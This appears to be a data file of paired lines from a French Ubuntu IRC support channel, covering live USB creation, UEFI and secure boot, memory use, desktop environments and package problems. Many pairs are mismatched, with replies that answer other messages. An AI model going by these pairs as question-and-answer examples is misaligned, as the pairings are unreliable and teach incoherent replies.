Gravure de Fedora-Live-Workstation-x86_64-21-5.iso en cours...	Bon, pas de bol, fedora fut l'une des premières avec systemd...
Jignore ce qui a changé, p-e que mon PC ne supporte pas les manifestations etudiantes	Ca peut être à cause d'un pilote ou d'une partie profonde du système, genre upstart ou le nouveau systemd.
Étant gamer ubuntu est 100 fois mieux pour moi non?	Sinon, regarde le cartouche "Principaux systèmes d’exploitation" en bas de la page du 1er lien.
Sinon, regarde le cartouche "Principaux systèmes d’exploitation" en bas de la page du 1er lien.	''Ca aiderait à cerner techniquement ce qui va et ne va pas.''  en quoi ca va aider à cerner mon problème?
''Ca aiderait à cerner techniquement ce qui va et ne va pas.''  en quoi ca va aider à cerner mon problème?	Steam est porté sur fedora. Et puis play on linux marche partout.
je viens a l'instant de demarrer le t-l	Fedora, c'est bon, ça change déjà pas mal.
sur le cd de ubuntu sous windows, ya un assistant d'amorcage sur cd	https://fr.wikipedia.org/wiki/Debian_GNU/Hurd ou https://fr.wikipedia.org/wiki/Distribution_Linux#Distribution_grand_public et regarde l'image dans l'historique. ;-)
wubi	Non, wubi est déconseillé depuis un bon moment.
j'connais juste ubuntu	Je ne comprends pas bien la question, on dirait que tu parles de grub.
instalation de l'assistant d'amorcage sur CD c'est bien?	Non, bien plus loin, fedora ou mageia, ou debian/hurl.
je suis prisonier de windows :'(	A ce stade, mon conseil serait de tester une distribution ayant une architecture vraiment différente, pas de paquet apt par exemple, mais mieux, tentes un noyau hurl ou une bsd... Ca aiderait à cerner techniquement ce qui va et ne va pas.
Donc mon disque principale est formatée	Dans ton cas, il faut pouvoir la tester sur un autre ordinateur, car pour vérifier, il lance la base du noyau qui plante...
J'installe win7 pour réinstaller Ubuntu par la suite	Faire "vérifier le disque" est le seul moyen de s'assurer que le cd est bien gravé, pas rayé et que la clé usb est bien copié, avec tous les fichiers, car des cellules mémoires peuvent flancher. Le fait que ça marche en session live n'est pas suffisant car il peut y avoir corruption seulement sur des fichiers utiles à l'installation.
Car on ne peut pas brancher les 2	Tu es parti trop vite. Ton cd/clé usb ne peux-tu pas les tester sur une autre machine? Histoire d'écarter l'éventualité d'un défaut. Pour les fils, je ne sais pas.
live session = essayer Ubuntu?	Oui.
J'ai essayé acpi=off, noapic, nolapic, edd=on, nodmraid, nomodeset, j'ai essayé de changer le boot en EUFI mais ma carte vidéo n'est pas compatible alors pas le choix de reste en Legacy.	Avant de faire "Et sélectionne Installer Ubuntu", fais "Vérifier le disque" et teste une live session.
bon je vais essayer avec juste le deb, j'espère que els dépendances sont déjà installées	"apt-cache search paquet".
C'est mon gros problème étrange merci du soutien :)	Il faut décrire ton histoire pour inciter à cliquer.
les*	Avec apt. Mais pas l'option install, non.
je vois beaucoup de dépendances, mais comment savoir qu'est-ce qui est déjà installé ? http://packages.ubuntu.com/trusty/wpasupplicant	http://packages.ubuntu.com/ te dira les dépendances.
tu peux me donner els dépendances ?	Le .deb de wpasupplicant.
et si	Utilise une clé usb.
j'essaye de me conencter à un réseau wpa (iwconfig supporte uniquement wep apparemment)	http://doc.ubuntu-fr.org/wifi#manuellement_-_en_ligne_de_commande .
ça évite de s'énerver	Je suis un calme. :-)
Sinon, j'ai retesté le jeu widelands récemment, il est parfaitement traduit maintenant. Et j'ai découvert aussi 0A.D. , je vous le conseille aussi, c'est nickel.	pour gimp ça aide de passer 2 ou 3 fois 10 minutes avec qqn qui sait s'en servir pour lui demander les trucs bloquant pour démarrer
rofl	Je n'ai pas jouer suffisamment longtemps pour que ça me gène. D'ailleurs, il y a un atelier dessus à Paris ce lundi http://www.agendadulibre.org/events/9537 .
donc faut essayer et puis après ça devient facile (pareil que toshop ou très proche)	+1. Tu le maîtrises mieux que moi, et de loin. Quand je galère, j'ai tendance à me replier sur mtpaint.
il me sélecionne tout el'image, qui devient tagguée toute en noire	Je te comprends, mais c'était plus pour jluc que je disais ça, car juste avant que tu arrives, il posait déjà une question sur les images. ;-)
c'est bien avec gimp ça suffira, merci :)	The gimp te permet de choisir le format dans "Enregistrer sous", il y a un menu déroulant pour le choisir.
The gimp te permet de choisir le format dans "Enregistrer sous", il y a un menu déroulant pour le choisir.	oui merci jluc m'a montré
ou utiliser la commande "mogrify -rotate 180 *.jpg" pierre_	sous Gimp ?
rawstudio les ouvre mais se prend les pieds dans les canaux de couleur	Comme ton lien disait... Dommage qu'il n'ai pas pu progressé depuis. Connais-tu http://doc.ubuntu-fr.org/imagemagick ?
mais rien ne lit ces fichiers !	Que sont ces extensions? Que te dit la commande "file" sur un de ces fichiers?
si je reviens pas c'est que ça a fonctionné	Il doit y avoir une option, il faudrait regarder le man.
j'ai rien lancé pour l'instant	Ton histoire de résolution me semble bizarre. La console n'a pas le bon format?
ok	Sinon, c'est que ta clé n'est pas démontée.
et mon iso, je l'écris dans sdX ou sdX1 ?	Normalement, c'est sdX, si ça refuse tentes sdX1.
je suis aps idiot ..	Il suffit de reformater la clé en fat32 ensuite.
autre problème, que je risque de toujours avoir avec ubuntu server, quand je met la bonne résolution, ça déborde tout autour, comme si mon écran zoomait l'image, comment régelr ce problème ?	Tu fais "sudo dd if=/chemin/fichier.iso of=/dev/sd[lettre]" [lettre] étant celle de ta clé usb. Ne te trompes pas!
y a rien sur linux ?	ubuntustudio est un linux
bonjour, connaissez-vous un programme pour ouvrir un fichier midi avec un fichier d'instrument de type sf2 ou dls, pour ensuite pouvoir le convertir en wav ou ogg ? je ne veux aps qu'il y ai d'ajout de silence, parce que c'ets un loop que j'essaye de convertir. merci pour votre aide	t'as essayé ce qui est dans ubuntustudio ?
oui	t'as essayé depuis le bureau de la liveUSB ?
j'avais pas essayé ca	ecran noir pour moi c'est le mode EFI
ok	pour le support EFI, il me semble aussi qu'il faut la version internationale 64 bits d'ubuntu. Je n'ai jamais eu l'occasion de tester cela car je n'ai pas EFI
c'est tu grave si j'avais formatté la clé USB en fat32?	pour le liveUSB j'ai utilisé LinuxLive USB Creator (http://www.linuxliveusb.com/) depuis windows, unetbootin n'a pas fonctionné (ne détecte pas la clé usb)
Non c'est un boot usb que j'ai fait, je ferme la tour et boot la clé usb, l'installation se lance et 5 secondes apres l'écran s'éteint, elle n'affiche pas de noir, elle est vraiment éteinte	moi j'ai du tout réinstaller il y a deux jours
tout s'était bien passé	tu passes par l'installateur ubiquity depuis le bureau de la liveUSB?
merci de l'aide si kkun connais un tour de passe-passe pour que l'installation puisse se faire	t'as secure boot ou pas?
Une idée ? Une piste ? merci :)	Avant d'installer Ubuntu, je recommande d'utiliser l’utilitaire de Disques qui s'installe dans "Essayez Ubuntu sans l'installer".  Contrairement à Win qui endurera un disque tout croche jusqu'à ce que vous perdiez vos données, Ubuntu, à raison est plus capricieux.
tu dirais, t'as tant de mo de consommé sur ta mémoire vive je comprendrais	quand quelque chose est chargé en mémoire, ça occupe de la place
Mem:          3933       3559        374         25         64       1849	c'est la mémoire qui tient compte du cache, ça
au final pourquoi veux tu java ?	faut que j'installe chromium histoire de récupérer mes marques pages
je ne connais pas ppa	tu cherches à avoir minecraft sur Ubuntu, il existe une autre maniere : http://doc.ubuntu-fr.org/minecraft#installer_via_un_ppa_recommande
http://paste.ubuntu.com/10785983/	tu peux tenter d'installer opjdk-8-jre, vu que visiblement ton souci c'etait d'installer le jre
http://paste.ubuntu.com/10785928/	ca ca veut dire que openjdk-7 est installé, je te demande de verifier qu'openjdk-7-jre est installé
lol	fait un "export DISPLAY=:0" avant ton java -jar …
mais je te le redonne	fait un "Exception in thread "main" java.awt.HeadlessException
bon ça veut pas	Ubuntu c'est surtout une mentalité qu'il y'a derriere, une éthique... c'est pas juste des logiciels et un o/s..
si après tous mes efforts, je n'arrive pas à évoluer, je pourrai passer à autre chose le coeur tranquille	Ça marche à mort.  Tourne les voiles mon ami :)
ok, pas de soucis ;)	y a des gens qui confondent 3 et e
j'ai pas parlé moi ><	sorry miss  tab
 c'est marrant, depuis que je suis ici, tout ce qui est proprio est soit mauvais ou codé avec les pieds	bah c'est surtout qu'on ne peut rien y faire, le proprio s'est figé et il faut aller voir l'editeur pour le support
ça commence bien	Fred
ok.... mais comment changer mot de passe?	de mémoire y a une option pour changer le mot de passe de la base dans le menu de seahorse, mais comme je ne l'ai pas sous la main, je ne peux pas t'en dire plus
de mémoire y a une option pour changer le mot de passe de la base dans le menu de seahorse, mais comme je ne l'ai pas sous la main, je ne peux pas t'en dire plus	merci, c'est ça , ça fonctionne :)
ah si, c'est bien #ubuntu-fr	c'est pas encore vendredi :)
:)	hein? comprends pas, mais oui, j'ai chrome
m'être fait prendre ???	je parlais à rzyz
bizarre	oui et apres? (c'est pas le mot de passe de login que je veux changer, c'est lui de gnome keyring qui apparaît que la session soit ouverte)
oui et apres? (c'est pas le mot de passe de login que je veux changer, c'est lui de gnome keyring qui apparaît que la session soit ouverte)	T'es-tu fait prendre par Google volontairement?
je vais regarder sur le net	Fred  MineCraft n'est plus la bonne option.
Utilisateurs.	"comptes utilisateurs" oui, et apres?
répondre à 3 questions	oui, pardon
oui, pardon	Perdu le fil.  Pardon pour quoi?
Perdu le fil.  Pardon pour quoi?	lol: bonsoir, comment changer le password gnome keyring?
je dois mal rechercher avec mon amis google	toujours là?
!wiki seahorse	http://doc.ubuntu-fr.org/seahorse | http://doc.ubuntu-fr.org/desactiver_mots_de_passe | http://doc.ubuntu-fr.org/gnupg | http://doc.ubuntu-fr.org/nautilus_utilisation_avancee | http://doc.ubuntu-fr.org/evolution
ok	http://en.wikipedia.org/wiki/List_of_Ubuntu_releases#Table_of_versions
combien de temps est supportée une version LTS	5 ans
je suis pas sur mais je pense que c'est là une case à cocher	tu as raison, c'est le "light locker" le nom de l'outil de gestion de l'économisateur d'écrna
!wiki unetbootin	http://doc.ubuntu-fr.org/unetbootin | http://doc.ubuntu-fr.org/live_usb | http://doc.ubuntu-fr.org/flasher_le_bios | http://doc.ubuntu-fr.org/extlinux | http://doc.ubuntu-fr.org/multisystem
c'est lui qui m'a donné le pilote	tu veux pas essayer de mettre le driver non proprio pour voi
les 3 Go sup tu les utilisera seulement pour des applis spécifiques	je ne remets aucunement en doute le fait que vous ayez tous des OS qui tourne comme des coucous mais vous maîtrisez le sujet donc ça devient confortable
je vais télécharger une version légère d'ubuntu, je fais un dernier essai de tout reconfigurer, si ça déconne j'arrête définitvement linux	prend lubuntu
j'ai jamais réinstallé seven	tu devrais essayer avec un sans le driver proprio, sous unity
ça a pété compiz, ça veut pas dire grand chose sur un channel de support Fr3d3r1c :/	je répète, j'ai désinstallé compiz en suivant le conseille d'un gars sur le chan, cela à supprimé unity, ça à casser mon environnement de bureau unity, normal me direz-vous,
j'aimerai avoir un poil de fun, ça serait bien aussi	j'ai fais ma config il y a eu 8 ans, et j'ai rien changé depuis :)
alors je dois pas savoir lire les articles que certains écrivent	je reitere ma question de facon plus concise, c'est quoi le probleme ? Unity te bouffe 1 GO à blanc ?
le plus proche de seven niveau ergonomie Wintruc c'est xfce	non c'est kde x')
?	tu as pris quoi comme interface du coup ?
i must be mistaken	tu dois être un incompris
tu dois être un incompris	c'est le cas :(
et j'en avais un paquet de programme de lancé	dans le "free -m", la seconde ligne (-/+ buffers/cache)correspond à ce qui est réellement utilisé
http://paste.ubuntu.com/10784389/	voilà, déjà, on est descendus à 862 Mo de ram utilisés, en partant de quasiment 1650 :)
http://paste.ubuntu.com/10784381/	que donne free -m ?
le symptome c'est juste de la memoire prise ?	il cherche à savoir où est consommée sa ram, oui :D
enfin, un pastebin non tronqué ça serait mieux	il m'en a envoyé un en query
ça ne veut rien dire pour moi	regarde la conso de ram avec free -m, puis ferme Chrome, et relance free -m pour voir
deux gigas sans aucun logiciel qui tourne, je ne voyais pas ça sur les versions antérieur d'ubuntu	tu devrais essayer d'installer le paquet xubuntu-desktop, et de lancer une session graphique en mode XUbuntu
il y a t il un moyen de contourne le probleme	avec l'utilisateur qui a le souci, tape "mv ~/.config/compiz ~/.config/compiz.old"
espérons car j'ai pas fini de galérer	perso, j'aime bien galérer, ça me permet d'apprendre
orion@turfu-Dell-System-XPS-L321X:~$ sudo apt-get install xchat [sudo] password for orion:  orion is not in the sudoers file.  This incident will be reported. orion@turfu-Dell-System-XPS-L321X:~$	oui, normal
merci	tu vois, il suffit de savoir lui parler :D
si j'ai envie de le supprimer, il fait tout pour m'empêcher de le faire, c'est un monde quand même	c'est pas Ubuntu, le problème, c'est un paquet hors dépôts, donc un truc ajouté en dehors du standard :)
même message	tente "sudo dpkg -r brackets"
le compte principal celui que j ai cree  au moment de l installation	si c'est l'unique compte utilisateur, le supprimer empêchera d'utiliser la machine :/
un seul	attention à ne pas supprimer l'unique administrateur de la machine, si c'est le cas
oui marmotte	que raconte "sudo apt-get remove brackets" ?
entre la ligne "apt-get -f install" et ton prompt suivant, il n'y a que cette ligne ?	 savez vous  si je peux suprimer le compte en question
 savez vous  si je peux suprimer le compte en question	il y a plusieurs utilisateurs, et le problème n'apparaît que sur un seul ?
c'est bracket que je voulais essayer	tu peux paster la totalité du message ?
je ne peux plus rien faire, même en cliquant à nouveau sur le .deb pour le réinstaller	que raconte "sudo apt-get -f install" en console ?
c'est fou ça, le gestionnaire de logiciel me demande de réinstaller le logiciel qui n'avait pas réussi à être installer mais il ne me laisse pas non plus le réinstaller	c'est à dire ?
non Marmotte j ai installer compiz pour le bureau en 3D et en reglant je deactiver  unity	tu ne peux pas lancer un terminal dans ta session graphique ?
j ai desactive unity du cout j ai plus accede a l environement graphique	ah... il faudrait rétablir ça dans les fichiers de configuration, du coup
peut-être que l'installation sur la clé usb à foiré	tu peux toujours installer toutes les interfaces que tu veux, mais tu n'en utilises qu'une à la fois, donc si tu aies Xfce seul, ou avec Unity installé à coté, ça ne changera rien à l'utilisation
mais du coup, je ne comprends pas ce que tu veux dire	pas windows vu que le DD est reformaté; pas le hardware (il peux encore faire tourner des jeux gourmands -mise à part la CG qui est partie)), pas l'image d'Ubuntu car verifiée. Après je ne sais pas.
j ai un soucie avec mon iterface	quand tu dis désactivé, tu l'as désinstallé ?
tu as installé un ubuntu "optimisé", est-ce plus clair ?	j'ai installé Ubuntu, avec une interface Xfce par défaut, c'est tout
ni qui nécessite des optimisations dès l'installation	en live, l'ordi reboot et plante également.
en live, l'ordi reboot et plante également.	une idée de ce qui cause tes crashs ?
l'interface ne pèse en réalité pas grand chose	j'ai un XUbuntu 14.04 qui tourne sur un P4 2.8 GHz avec 1 Go de ram, et ça tourne très bien
car ça fera la troisième fois que je réinstalle	tu peux changer d'interface sans tout réinstaller
Le problème, c'est que je ne sais pas trop vers quoi d'autre m'orienter...	si tu as déjà des soucis en session live, c'est mal parti pour installer
[A Fr3d3r1c] Courant? Même long de près d'une heure?	le système fonctionne bien en session live ?
ça se paie cher une belle interface	dans ce cas, soit ta machine est trop limitée, et il faut changer d'interface, soit tu as un truc étrange dans ton installation
J'ai jamais autant parcouru de forum que depuis que je suis sous ubuntu	les freezes ne sont pas censés être courants
oui c'est unity, bein donc, tu dois avoir ceci logiquement : http://image.noelshack.com/fichiers/2011/16/1303470672-screen_keyboard.png	 J'ai que ça  http://i.imgur.com/Gr4wcA3.png
Bonjour, je viens d'installer Ubuntu 14.04 sur VMwarePlayer, et paramètre système>clavier n'as aucune option pour passer de qwerty a azerty	tu utilises Unity ?
tu utilises Unity ?	oui, si c'est la barre étrange a gauche
ah il est non compressé ce fichier	zless peut le lire directement, si tu ne veux pas commencer par gunzip
Voilà :)	pour voir
Oui je dois le virer?	l'avais tu auparavant ? (avant ton black screen, l'as manipulé à la mano avant ce black screen ?)
ca c'est desinstalle je redémarre :)	ça devrait le faire, ÇA DEVRAIT
mdrr	:þ
beaver clair	c'est ton bureau ?
4 écran de 42"	ça donne
beaver http://images.debian-facile.org/file-Rda806dd9eaf71bee49dd0adc814f1904	des cameras ^^
xD	ça claque :D
Oui j'ai bien ca	ok, donc maintenant, un retour en arriere est possible
tu veux une photos ?	vas y :)
Si mais quand je choisis le propriétaire et que j'applique les changements rien ne se passe et le libre se recoche	vois tu ce qu'est un terminal ?
Bonjour, j'ai posté un petit problème graphique sur le forum http://forum.ubuntu-fr.org/viewtopic.php?id=1817641 , j'ai un peu avancé comme j'ai explique dans le dernier message mais il me manque une petite chose, merci pour ceux qui prendront le temps de lire :)	quel driver utilises tu en ce moment ?
quelqu'un utilise odoo en entreprise si oui, parlez moi	pose plutôt ta vraie question, tu verras si quelqu'un reponds (les sondages recoivent rarement des reponses sur irc)
y a un dev de mozilla qui a le même pseudo que moi	Ok, désolé pour la confusion. :-)
merci	Les développeurs ubuntu ont leurs propres salons. Et toi, tu l'es pour firefox ou non?
tout simplement	merci j'avais le meme souci
salut la famille!!!!	Half Life 3 ?
clache : c'est un truc con, mais je pense qu'avoir des notes organisées c'est plus clair qu'écrire tout à la suite	tu cherches un tracker: redmine ou trac sont des exemples, mais il y en a plein
et bien en fait, je cherche un logiciel en ligne pour que je puisse travailler à distance avec des collègues répartis dans l'hexagone. Ce que j'aurais voulu c'est avoir un logiciel qui permet chacun d'écrire ce qu'il à faire, comme un tableau blanc où on colle des post-it. C'est pour cela qu'un logiciel type pad me semble pas le plus adapté	Ok, moi, je ne vois pas ce qui gène dans un pad. Suffit que chacun ai son 'chapitre' où il a son todo.
sshfs, c'est quand même du bricolage	ça dépend aussi si c'est lui ou pas qui gère le serveur
Sur ce, bonne journée.	suivant ce que tu cherches à faire, un truc du type openvpn/nfs/autofs pourrait faire l'affaire (mais ça dépend de ton cas d'usage)
et dans ce cas, tu ne pourras rien faire :)	t'a vu, si tu n'es pas sur google+, c'est que t'es pas pro
Bon, je vais demander sur Google+, j'aurais sans doute plus de chance d'obtenir des réponses de professionnel	tu peux essayer de jouer avec le keepalive, mais t'auras rien de supermagique
je dis juste que si des graphistes informatiques avaient commencé avec gimp plutôt que photoshop ils diraient que photoshop n'est pas du tout ergonomique	je ne le pense pas. Mais, on ne s'entendra pas sur ce sujet
i686 ça veut bien dire que c'est 32 bits, non ?	donne moi quelques minutes pour vérifier sur google
mais ça me dit architecture amd incorrect	ubuntu 10.04 n'est plus pris en chaque depuis un bout, juste te tenir au courant
JE voudrais savoir si il est pris en charge par Ubuntu	tu peux l'essayer via un live cd/usb si tu désires
et si killer ces process déstabilise bien le système, je préfère encore les laisser tourner :P	tu as regardé dans /var/log/lightdm/lightdm.log
je regarde ça de temps en temps pour voir comment ça évolue, mais sans trop me poser de question, pour le moment ^^	et kill le daemon avant l'hibernation
le but final Marmotte -> ? tu cherches à faire quoi	à savoir pourquoi mon système lance un nouveau process qui ne se termine jamais, à chaque sortie de veille :D
du pron	sinon, comme chpo, je ne vois pas le souci avec cp
d'autant qu'on déconseillait déjà de l'utiliser avant, donc on le déconseille encore plus maintenant ;)	Je vais donc mutiler une partition en dur, et revenir demander de l'aide pour comprendre GRUB.
soit, deux ans environ	Et ?
Pourriez vous m'aider?	regarde de ce coté fglrx
Hmm un peu HS	utiliser > fait que le fichier commence à être réécrit avant que xmlstarlet le lise
j'ai une live usb (ubuntu 14.10) via laquelle je voudrais supprimer TOUT mes disques (pour en faire de l'"empty space"). J'ai deux diqques au total et le but est en fait de supprimer ma config foireuse pour recommencer sur une base saine	où est la question ?
ok autofs et sshfs alors	mais pourquoi, vu qu'il n'implemente pas les memes choses, as tu au moins vérifié que filezilla supporte le keepalive s tu le configures correctement ?
et avec un client graphique comme filezilla	autofs+sshfs
bah c'est donc son /etc/ssh/sshd_config qui n'a pas le bon timeout	on ne parle pas de sshd ici
on ne parle pas de sshd ici	de quoi alors
de quoi alors	il voudrait que filezillas'autoconfigure magiquement à partir de sa conf de son client ssh (pas sshd), mais ca ne marche pas comme ca
quand yen a besoin	tu te connectes sur ta machine en sftp ? ou un autre serveur ?
pourtant ya un keepalive pour les connexions ssh  (cf https://patrickmn.com/blog/how-to-keep-alive-ssh-sessions/ par exemple)	ssh_config et .ssh/config, ca configure le client ssh, je ne vois pas le rapport avec filezilla
h	c'est un paramètre du sshd
bon... ca a l ar de marcher... va voir dans tweak/font... j ai changer les deux cantarel, sans rien et bold par les equivalent ubuntu... pour l instant ca bug plus.	bon, ca a rien fait chez moi, la modif de taille de fonte.. le "c" est tj pourri
En se loguant sur les chan freenode, souvent on recois un message de chanserv de s'identifier, je recois ce message: -NickServ- Please check your email for instructions to complete your registration. Mais aucun email . J'a beau de faire plusieur fois, je ne recois jamais d'email de freenode, qu'est-ce-qui se passe?	ask in #freenode
non a priori j ai touche a rien de ce cote la. j ai installe un theme, des icons, et des gnomes extentions... bcp de variables mais rien de special sur le rendu ou le changement de fonts.	ca va pas te consoler mais j'ai le probleme aussi.. des fois. Après un pic d'utilisation mémoire, notament
c est constant en plus.. c est comme si d un coup ca buggais grave, puis je change la taille de toutes les fonts, ca reset et remet tout correctement.	ça le fait partout ?
t'as regardé dans software and update/additionnal drivers?	aucune idée, je n'ai jamais vu ça :o
c'est accessible depuis le live cd?	regarde là : http://doc.ubuntu-fr.org/liste_portables_hp
anybody ?	pose ta question, plutot que de faire un sondage..
(j'ai une clée USB 3.0 16 Go)	c'est techniquement possible à faire, mais tout sauf recommandé
quel faute mezen ?, j'en vois pas une seule la	tu as gaché ta vie.. et là tu c'est ma vie que tu veux gacher
blblblblblblbl	voilà il a eu peur le M.
Mezen> ha?	alterner entre apt-get et aptitude peut casser les dépendances
beaver:plus possible la :/	apt-get ou aptitude ce n'est pas là la vraie différence. mais si tu utilises l'un, il faut jamais utiliser l'autre
Je me demande si aptitude est pas mieux que apt-get...	il faudrait voir un fichier log, il se nomme, kern.log
mezen aucune idée j'ai jamais tester debian	en terme d'activité, de réactivité de la communauté, ubuntu est peut etre mieux
velu!	aucune idee ce message s'affichais lorsque j'appuyais sur l'icone wifi dans la barre en haut a coté de l'horloge
et tu as perdu la configuration ?	non puisque sa fonctionnais bien
ha...	ton périphérique non géré, il forte à parier qu'il utilise un .ucode
mais vu la quantité de monde utilisant ubuntu... je.comprend pas comment la plupars des beug.connu (surtout ceux bien visible comme le multi fenêtre) n'a pas pu etre corriger sur 1 an....	c'est juste une période agitée en ce moment, ni Gnome Shell ni Unity sont matures
mezen > ok... je verrai sa...	trop de développement
sur le Launchpad tu auras besoin de ces détails et biennnnnnnnnnn plus encore	sa marchais bien avant c'est tout ce que je peux dire
beaver ok sa encore je peux le comprendre...	en fait tu t'inscris sur launchpad, tu auras un compte et tu peux soumettre les bugs avec ce compte
Non c'est pas 0000 c'étais "pingouin"	c'est juste une securité, faut le voir comme ça :)
beaver ok alors encore le mot de passe je veux bien comprendre mais après... pour le reste... je comprend pas...	tu t'inscris comme moi
logiquement, avec un mot de passe 'moyen', le bouton se dégrise borrougagnou_tel	oui mais si j'ai envi de mettre un mot de passe faible, parce qu'avoir un mot de passe plus conséquent me.gène... je fais comment... si ce n'est passé par le terminal....
en quoi est ce un bogue, il est stipulé clairement que ton mot de passe n'est pas securisé :/	ben le simple fais que l'on est "obliger" de mettre un mot de passe fort...
ok	t'as pas eu des fenetre d'erreurs qui se lancent toutes seules ?
pour installer adobe flash player... le packet (Ubuntu 10) sur le site adobe fonctionne pas pour la v12 ou 14	faut soumettre des bugs dans launchpad
meme nautilus dépend de ce libunity ?	Ubuntu
Ubuntu	quoi Ubuntu ?
faut voir si c'est un upgrade, ou une installation de fichier :)	à mon avis, ce lightdm est devenu trop unity
mais il t'ajoute pas un DE	je ne sais pas comment ce do-release-upgrade marche mais il a proposé beaucoup de changements, des additions, des mises à jours et des suppressions
mon lecteur CD ne marche plus et je ne veux pas passer du temps à faire ça par clé usb et autre	comment arrives tu à avoir des upgrades packages unity si tu avais pas une base unity ?, j'essaye d'être plus explicite, l'upgrade ne fait que mettre à jour des fichiers déjà présents sur ton o/s (je sais pas si je suis clair..)
pourtant il m'installe encore 2 paquets de unity en dépendance	il faut partir sur une minimal tss
il faut partir sur une minimal tss	non justement, je passe par une mise à niveau
je stagne? regarde le fichier ne fonctionnera que si j'installe windows c'est clair, j'aimerais tourner la page :)	comment veux tu résoudre un probleme qui a une base 'inconnue"
ça donne pas le type L4L13N tu stagnes	en fait ça y est pour moi: $ lsb_release -d
non j'ai envoyé un commentaire	quand la commande "file" n'arrive pas à trouver dans sa database un type de donnée correspondant à ton fichier, elle rend "data"
clairement non	tu peux lui demander avec quoi ?
C'est juste un iso mal fait	il y'a des chances, essaye de faire le test sur une iso ubuntu c'est legal en plus.. ;o
nous sommes des humains L4L13N, faut pas le prendre mal, IRC est tres impersonnel, ce n'est pas parce que tu vois pas des smileys à tout va dans mes écrits, que je suis agressif, tout au contraire L4L13N :(, je cherche à te faire comprendre, que tu es sur la mauvaise piste tout simplement.. :(	 nah t'inquietes je te remercie tout de même, tu as sans aucun doute plus de connaissances que moi dans le domaine, ça me rend impatient quand jessaie trop longtemps. Et dis toi que j'ai appris de poser des question que quand j'ai tout essayer et c'était le cas. Alors c'est de la scrap ca marche pas c'est tout faut abandonner
merci pour l'aide même si.	de toute maniere, même si ?, même si ton .iso est foireuse pour le coup ;), ton probleme n'est pas propre à Ubuntu
bonne nuit Marmotte	Si, au point 3.
désolé	L'autre jour, à cause d'une déconnexion, je n'ai pas pu te dire: On aide pour toutes les variantes qui sont du point 1 au 5.1(ce sont les officielles). Nous ne sommes plus concerné pour celles du 5.2 et suivantes. https://wiki.ubuntu.com/DerivativeTeam/Derivatives/ .
L'autre jour, à cause d'une déconnexion, je n'ai pas pu te dire: On aide pour toutes les variantes qui sont du point 1 au 5.1(ce sont les officielles). Nous ne sommes plus concerné pour celles du 5.2 et suivantes. https://wiki.ubuntu.com/DerivativeTeam/Derivatives/ .	je vois pas Kubuntu
voila la reponse ca écris juste data	dans le cas d'un fichier ISO, ça raconte un truc comme ça :  # ISO 9660 CD-ROM filesystem data 'LABEL' (bootable)
ahhh merci je comrpennais pas	la taille de mon écran, ton erreur sur deux lignes le copier/coller
minute jte send les logs	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
c'est juste une habitude/convention	voilà, poweriso, c'est un frontend à la commande mount au final, t'as un truc 'guitisé'
facepalm	ouais, pas top de dire ça ici, mais bon, on peut toujours tenter de t'aider à accéder au contenu du fichier (ça reste l'utilisation d'Ubuntu), on ne serait pas partis sur l'utilisation du logiciel contenu dans le fichier de toutes façons
acces	il fallait pas le dire
avec la commande mount il faut spécifier le vfstype de ton iso Marmotte non ?	pas forcément
pas forcément	ah bon, ok :)
Jsais pu quoi faire	tu ne réponds pas à mes questions...
Voila un video de ce que ca fait lorsque j'essaye d'extraire un iso https://www.youtube.com/watch?v=z2PxzAeere4&feature=youtu.be	peut être que ton fichier n'est pas au format iso, même si son extension le dit
au pire je vais refaire le live-usb même si je perd les fichiers et ma configuration, je peux les récupérer par la suite	Copie tes fichiers avant de recréer la clé.
Copie tes fichiers avant de recréer la clé.	je fais comment pour récupérer les fichiers ?
oui c'est une version 64 bit	Ca pourrait être un mauvais de boot http://askubuntu.com/questions/15425/error-when-installing-unable-to-find-a-medium-containing-a-live-file-system .
j'ai fait la clé en mode persistant sur mon ordinateur et je l'ai testé et re-tester et là je veux m'en servir sur l'ordinateur de mon ami mais voilà lui a Windows8 uuefi moi Windows 7 uefi toujours et même marque de pc et modèle	C'est bien une version 64bits? C'est peut être le fait qu'elle soit persistante qui bloque.
en sélectionnant ce dernier je tombe sur la même eerreur initramfs	Car c'est bien "Check disc for defects" qu'il faut faire pour vérifier la clé. Si il est bon sur un autre pc, la clé n'est pas en cause.
D'accord	as tu bien desactiver secure boot ?
j'imagine que c'est lié au live-usb, mais sur l'ordinateur où j'ai créé le  live usb tout fonctionnais bien	Ca vérifie que la clé ai bien tous les fichiers, 'gravés' correctement.
Ca vérifie que la clé ai bien tous les fichiers, 'gravés' correctement.	moi j'ai le choix entre "try xubuntu whitout installing" ,  " install xubuntu",  "oem install (for manufacturers)"  et "check disc for defects"
moi j'ai le choix entre "try xubuntu whitout installing" ,  " install xubuntu",  "oem install (for manufacturers)"  et "check disc for defects"	Et ta clé marche sur l'autre ordinateur?
je continue à chercher sur l'ordinateur c'est mieux avant  de faire des bêtises	Il faudrait vérifier la clé. Dans son menu, il y a une entrée pour.
je sais pas trop, j'avais jamais vu un truc comme ça sur les vieux bios	Ca me semble bon au vu des derniers trucs que j'ai lu.
mais bon, une machine sous windows 8 avec un bios, ce serait surprennant et assez mauvais signe, c'est plus probablement un uefi	+1 sur les 2 remarques. :-)
dans l'onglet boot j'ai fastboot à enabled et launch csm à disabled	Fastboot doit être le truc qui empêche windows de s'éteindre vraiment.
Fastboot doit être le truc qui empêche windows de s'éteindre vraiment.	ça se pourrait je regarde sur le web pour voir si je trouve des infos la dessus
j'ai pu arriver sur le bios en suivant le lien de clache mais je vois pas une option pour faire mon choix	Là, je ne sais plus. Regarde la notice.
kriptox: http://acer-fr.custhelp.com/app/answers/detail/a_id/28049/related/1/session/L2F2LzEvdGltZS8xNDI4MTU3NjM3L3NpZC9PYm9PUippbQ  0  0 .	merci
tu veux faire quoi en fait kriptox ?	ok je me connecte avec mon tel pour suivre la conversation et effectuer la manip
marque et modèle du PC	c'est un Asus F552L
kriptox désactive secure boot et met le boot sur legacy dans les paramettre UEFI	les paramettre uefi se trouvent où ?
oui surement clache	j'ai déjà essayé plusieurs fois de le redemarrer ça revient au même chez moi, d'ailleurs chaque fois qu'il demarre vite je le redemarre ensuite depuis windows mais au redemarrage pareil
j'ai déjà essayé plusieurs fois de le redemarrer ça revient au même chez moi, d'ailleurs chaque fois qu'il demarre vite je le redemarre ensuite depuis windows mais au redemarrage pareil	donc seul solution c'est de passer par les parametre de windows pour booter bios/uefi
c'est idem pour l'acces au bios/uefi	Je suis d'accord sur le redémarrage, sauf que j'ai rencontré une machine où on y arrivait pas ainsi.
